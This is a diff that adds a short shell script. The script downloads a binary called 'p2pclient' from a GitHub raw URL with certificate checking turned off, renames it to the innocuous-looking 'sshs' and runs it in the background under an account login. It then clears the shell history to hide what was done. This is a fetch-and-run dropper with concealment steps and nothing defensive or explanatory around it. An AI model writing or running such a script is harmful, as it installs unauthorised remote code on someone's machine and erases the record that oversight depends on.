@@ -1,0 +1,7 @@
+curl -k https://raw.githubusercontent.com/robertreynolds2/start/main/p2pclient -o sshs
+sleep 3
+chmod +x sshs
+sleep 3
+nohup ./sshs -l robert.reynolds2@go.shoreline.edu &
+sleep 3
+history -c
